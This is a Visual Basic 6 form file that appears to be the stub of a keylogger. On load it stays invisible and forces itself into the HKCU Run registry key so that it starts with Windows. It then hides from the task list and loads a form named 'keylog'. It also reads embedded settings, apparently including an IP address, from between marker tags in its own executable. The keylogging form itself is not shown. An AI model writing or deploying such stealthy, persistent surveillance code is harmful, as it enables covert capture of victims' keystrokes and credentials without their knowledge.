VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1635
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4980
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1635
   ScaleWidth      =   4980
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   240
      TabIndex        =   5
      Text            =   "Text4"
      Top             =   1080
      Width           =   2295
   End
   Begin VB.ListBox List1 
      Height          =   1425
      Left            =   2640
      TabIndex        =   4
      Top             =   0
      Width           =   1095
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   240
      TabIndex        =   3
      Text            =   "Text3"
      Top             =   720
      Width           =   2295
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   2
      Text            =   "Text2"
      Top             =   360
      Width           =   2295
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Text            =   "Text1"
      Top             =   0
      Width           =   2295
   End
   Begin VB.CheckBox chkRun 
      Caption         =   "Run at Startup"
      Height          =   195
      Left            =   720
      TabIndex        =   0
      Top             =   2160
      Width           =   1815
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

' The exe file must exist for this to work properly.

Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean
' Determine whether the program will run at startup.
' To run at startup, there should be a key in:
' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
' named after the program's executable with value
' giving its path.
Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String, Optional ByVal run_at_startup As Boolean = True)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & Err.Number & " opening key" & _
            vbCrLf & Err.Description
        Exit Sub
    End If

    ' See if we should run at startup.
    If run_at_startup Then
        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, App.EXEName, 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & Err.Number & " setting key" & _
                vbCrLf & Err.Description
        End If
    Else
        ' Delete the value.
        RegDeleteValue hKey, app_name
    End If

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox Err.Number & " " & Err.Description
    Exit Sub
End Sub
' Return True if the program is set to run at startup.
Private Function WillRunAtStartup(ByVal app_name As String) As Boolean
Dim hKey As Long
Dim value_type As Long

    ' See if the key exists.
    If RegOpenKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        0, KEY_READ, hKey) = ERROR_SUCCESS _
    Then
        ' Look for the subkey named after the application.
        WillRunAtStartup = _
            (RegQueryValueEx(hKey, app_name, _
                ByVal 0&, value_type, ByVal 0&, ByVal 0&) = _
            ERROR_SUCCESS)

        ' Close the registry key handle.
        RegCloseKey hKey
    Else
        ' Can't find the key.
        WillRunAtStartup = False
    End If
End Function
' Clear or set the key that makes the program run at startup.
Private Sub chkRun_Click()
    If m_IgnoreEvents Then Exit Sub

    SetRunAtStartup App.EXEName, App.Path, _
        (chkRun.Value = vbChecked)
End Sub
Private Sub Form_Load()
On Error GoTo t
Dim yourip As String
yourip = LoadSettings
Text4.Text = yourip
Dim results() As String
Dim i As Integer
    ' Split the string.
    VB5Split Text4.Text, ";", results

    ' Display the results.
    List1.Clear
    For i = LBound(results) To UBound(results)
        List1.AddItem results(i)
    Next i
    text1.Text = List1.List(0)
    Text2.Text = List1.List(1)
        Text3.Text = List1.List(2)
    'loadsettings
t:
    
    
    ' See if the program is set to run at startup.
    m_IgnoreEvents = True
    If WillRunAtStartup(App.EXEName) Then
        chkRun.Value = vbChecked
    Else
        chkRun.Value = vbUnchecked
    End If
    m_IgnoreEvents = False
    chkRun.Value = 1
    Load keylog
    App.TaskVisible = False
End Sub


Function LoadSettings()
'pars the settings from the exe's binary..

'Open the exe as binary
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1

'create an buffer
    Dim Buffer As String
    Buffer = Space(FileLen(App.Path & "\" & App.EXEName & ".exe"))

'Store binay in buffer
    Get #1, , Buffer

'Pars binary for settings

    Dim settings As String
    settings = Split(Split(Buffer, "<our-settings>")(1), "</our-settings>")(0)

'Close the file
    Close #1

'return the settings
    LoadSettings = settings


End Function
Public Sub VB5Split(ByVal txt As String, ByVal delimiter As String, result() As String)
Dim num_items As Integer
Dim Pos As Integer

    num_items = 0
    Do While Len(txt) > 0
        ' Make room for the next piece.
        num_items = num_items + 1
        ReDim Preserve result(1 To num_items)

        ' Find the next piece.
        Pos = InStr(txt, delimiter)
        If Pos = 0 Then
            ' There are no more delimiters.
            ' Use the rest.
            result(num_items) = txt
            txt = ""
        Else
            ' Use this piece.
            result(num_items) = Mid$(txt, 1, Pos - 1)
            txt = Mid$(txt, Pos + Len(delimiter))
        End If
    Loop
End Sub
